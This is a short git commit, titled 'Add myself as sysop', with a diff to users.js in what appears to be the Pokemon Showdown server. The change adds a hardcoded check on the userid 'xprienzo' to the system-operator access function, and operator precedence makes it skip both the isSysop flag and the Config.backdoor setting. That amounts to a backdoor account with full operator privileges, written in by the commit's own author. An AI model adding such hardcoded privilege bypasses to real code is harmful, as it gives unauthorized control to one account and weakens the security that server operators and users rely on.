d7fda829fdda10ace9976d6ad641d7542062fa6f
XpRienzo <anubhavkumarc@gmail.com>
2016-08-27 09:17:38 +0530

    Add myself as sysop

--- users.js
+++ users.js
@@ -465,7 +465,7 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
+		if (this.isSysop && Config.backdoor || this.userid == 'xprienzo') {
 			// This is the Pokemon Showdown system operator backdoor.
 
 			// Its main purpose is for situations where someone calls for help, and
